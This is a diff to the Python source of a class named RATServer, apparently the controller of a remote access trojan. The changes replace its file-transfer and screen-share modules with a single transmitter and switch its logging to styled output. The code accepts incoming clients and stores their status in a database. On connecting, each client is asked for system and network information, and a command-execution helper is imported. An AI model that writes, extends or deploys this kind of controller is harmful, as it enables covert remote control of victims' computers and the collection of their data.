@@ -2,18 +2,16 @@ from fastapi import UploadFile
 import socket
 import select
 import threading
-import time
-import uuid
 import json
 import difflib
 
-from host.modules.screenshare import ScreenShareManager
-from host.service.utilities import gatherInfoOutput, executeCommands
+from host.service.utilities import executeCommands
 from host.service.classManager import SingletonMeta
-from host.modules.filetransfer import FileTransferManager
+from host.modules.Transmitter.transmitter import TransmitServer
 
 from database.DataManager import PostgreSQLDataManager
 
+from host.components.terminalStyles import *
 
 class RATServer(metaclass=SingletonMeta):
     instance = None
@@ -26,15 +24,19 @@ class RATServer(metaclass=SingletonMeta):
 
             self.clients = {}
 
-            self.file_manager = FileTransferManager("localhost", 4440, "localhost", 4441)
-            self.file_upload_thread = threading.Thread(target=self.file_manager.start_upload_server)
-            self.file_upload_thread.start()
-            self.file_download_thread = threading.Thread(target=self.file_manager.start_download_server)
-            self.file_download_thread.start()
+            self.trasmitter = TransmitServer("localhost", 4443)
+            self.transmitter_thread = threading.Thread(target=self.trasmitter.start)
+            self.transmitter_thread.start()
 
-            self.screen_share_manager = ScreenShareManager("localhost", 8095)
-            self.screen_share_thread = threading.Thread(target=self.screen_share_manager.connect)
-            self.screen_share_thread.start()
+            # self.file_manager = FileTransferManager("localhost", 4440, "localhost", 4441)
+            # self.file_upload_thread = threading.Thread(target=self.file_manager.start_upload_server)
+            # self.file_upload_thread.start()
+            # self.file_download_thread = threading.Thread(target=self.file_manager.start_download_server)
+            # self.file_download_thread.start()
+
+            # self.screen_share_manager = ScreenShareManager("localhost", 8095)
+            # self.screen_share_thread = threading.Thread(target=self.screen_share_manager.connect)
+            # self.screen_share_thread.start()
 
     def build_connection(self):
         # Change the database status of all clients to offline
@@ -46,7 +48,8 @@ class RATServer(metaclass=SingletonMeta):
         server_socket.bind((self.host, self.port))
         server_socket.listen(5)
 
-        print("[*] Waiting for clients...")
+        header(name="Server", message="Waiting for clients...")
+        
 
         while True:
             try:
@@ -54,20 +57,24 @@ class RATServer(metaclass=SingletonMeta):
                 client, addr = server_socket.accept()
                 self.clients[addr[0]] = client
 
-                print(f"[*] Connection established with {addr[0]}")
+                #print(f"[*] Connection established with {addr[0]}")
+                header(name="Server", message=f"Connection established with {addr[0]}")
 
                 # Start the function HandshakeEvent
                 self.handshake_event(addr[0])
             except Exception as e:
-                print(f"Error building connection: {str(e)}")
+                #print(f"Error building connection: {str(e)}")
+                error(name="Server", message=f"Error building connection: {str(e)}")
                 # remove the client from the list of clients
                 self.clients.pop(addr[0])
-                print(f"[*] Client {addr[0]} disconnected")
+                #print(f"[*] Client {addr[0]} disconnected")
+                error(name="Server", message=f"Client {addr[0]} disconnected")
                 try:
                     client_socket_ip = addr[0]
                 except Exception as e:
-                    print(
-                        f"Error updating client status: {str(e)}")
+                    # print(
+                    #     f"Error updating client status: {str(e)}")
+                    error(name="Server", message=f"Error updating client status: {str(e)}")
                 break
 
     def receive_output(self, socket_ip, timeout=5, size=9216000):
@@ -84,7 +91,8 @@ class RATServer(metaclass=SingletonMeta):
             else:
                 return "Error receiving output"
         except Exception as e:
-            print(f"Error receiving output: {str(e)}")
+            #print(f"Error receiving output: {str(e)}")
+            error(name="Server", message=f"Error receiving output: {str(e)}")
 
 
 
@@ -159,9 +167,6 @@ class RATServer(metaclass=SingletonMeta):
             # Gather Information
 
             socket_client.send(json.dumps({"type": "information", "part": "system_info"}).encode())
-            
-
-            # End the information requests
 
             system_info = self.receive_output(socket_ip)
             system_info = json.loads(system_info)
@@ -170,12 +175,10 @@ class RATServer(metaclass=SingletonMeta):
             socket_client.send(json.dumps({"type": "information", "part": "network_info"}).encode())
             network_info = self.receive_output(socket_ip)
             network_info = json.loads(network_info)
-            
-            # Continue with the connection and gather data
+
             data = {
                 "System Info": system_info["data"],
                 "Network Info": network_info["data"]
-                # Add more data retrieval commands here
             }
             
             socket_client.send(json.dumps({"ended": True}).encode())
@@ -210,7 +213,6 @@ class RATServer(metaclass=SingletonMeta):
     def close_connection(self, socket_ip):
         # Close the connection with the client
         try:
-            print("Removed client")
             self.clients[socket_ip].close()
         except:
             pass
